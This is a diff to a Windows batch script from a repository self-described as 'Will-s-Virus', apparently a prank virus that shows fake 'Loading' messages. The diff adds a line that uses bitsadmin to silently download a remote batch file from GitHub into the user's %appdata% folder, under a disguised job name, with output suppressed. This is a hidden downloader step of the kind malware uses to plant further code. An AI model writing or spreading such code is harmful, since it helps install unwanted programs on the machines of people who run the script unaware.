@@ -33,6 +33,7 @@ ping localhost -n 1 >nul
 cls
 echo Loading..
 if not exist "%temp%\bruh.mp3" bitsadmin /transfer Media.mp3 /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/Bruh_Sound_Effect.mp3" "%temp%\bruh.mp3" >nul
+if not exist "%appdata%\willishot\notif.bat" bitsadmin /transfer willishot.exe /download /priority foreground "https://github.com/AA206yt/Will-s-Virus/raw/main/notif.bat" "%appdata%\willishot\notif.bat" >nul
 ping localhost -n 1 >nul
 cls
 echo Loading...
